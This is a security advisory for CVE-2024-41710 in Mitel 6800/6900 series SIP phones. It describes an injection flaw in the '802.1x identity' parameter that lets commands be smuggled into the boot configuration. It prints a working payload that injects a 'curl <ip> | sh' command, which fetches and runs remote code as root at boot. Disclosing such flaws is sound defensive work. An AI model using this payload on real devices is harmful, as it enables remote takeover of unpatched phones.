# Mitel 6800 6.3.0.1020

The Mitel 6869i SIP Phone, firmware version `6.3.0.1020` fails to properly sanitize user supplied input. Multiple endpoints were found susceptible to this technique, however for demonstration purposes and in order to gain root access to the device, the endpoint '802.1x Support' (`8021xsupport.html`) and parameter `802.1x+identity` were taken advantage of.

Requests to ``8021xsupport.html`` can be used to update the devices local configuration (`/nvdata/etc/local.cfg`). By sending a specially crafted HTTP POST requests It's possible to smuggle in entries that would have originally been blocked by the applications sanitization checks.

By sending the byte value of `%dt` the  `linemgrSip` web application will interpret this as a line ending character `%0d`.  This character interpretation can be levered during the boot process, where the contents of `/nvdata/etc/local.cfg` are read and used to perform startup actions. During boot, the device will overwrite higher position entries. The `hostname` entry was targeted due to It's use with the `udhcpc` startup process.

The following payload Is specified in the `802.1x+identity` HTTP POST parameter to gain code execution.

```
AAAAA%dthostname: QWERTY -t 302400 -T 6 -b -a -i eth0 -s /usr/share/udhcpc/default.script -p /var/run/udhcpc.eth.pid; curl <ip> | sh ;%dt%dt%dt
```

During boot, the application will overwrite the targeted `hostname` entry in `/nvdata/etc/local.cfg`. The `hostname` entry is subsequently used during boot and will execute the prepended shell script.

## Affected Assets
Affected assets are based on tested firmware versions. It's possible that other versions may contain the same vulnerability. 
**6800 R6.3.0.1020**
- https://swdl.mitel.com/swdl/6800-Phones/6800_R6.3.0.1020_(R6.3.0.SP1).zip

**R6.4.0.HF1 (R6.4.0.136) and earlier**
* Mitel 6800 Series SIP Phones
* Mitel 6900 Series SIP Phones
* Mitel 6900w Series SIP Phone
* Mitel 6970 Conference Unit

### CVE-ID
CVE-2024-41710

### Security Advisories
[mitel.com](https://www.mitel.com/support/security-advisories/mitel-product-security-advisory-24-0019)

### Credit
Kyle Burns (kburns@packetlabs.net)